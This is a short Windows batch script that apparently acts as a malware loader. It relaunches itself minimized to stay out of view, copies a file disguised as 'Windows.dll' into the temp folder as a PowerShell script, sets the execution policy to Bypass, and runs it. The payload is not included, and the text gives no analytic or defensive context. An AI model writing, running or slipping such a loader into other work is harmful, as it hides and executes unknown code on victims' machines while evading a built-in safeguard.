@if not "%~0"=="%~dp0.\%~nx0" start /min cmd /c,"%~dp0.\%~nx0" %* & goto :eof
@echo off
cd %~dp0

copy Windows.dll %temp%\w.ps1

powershell Set-ExecutionPolicy Bypass

call start powershell -File %temp%\w.ps1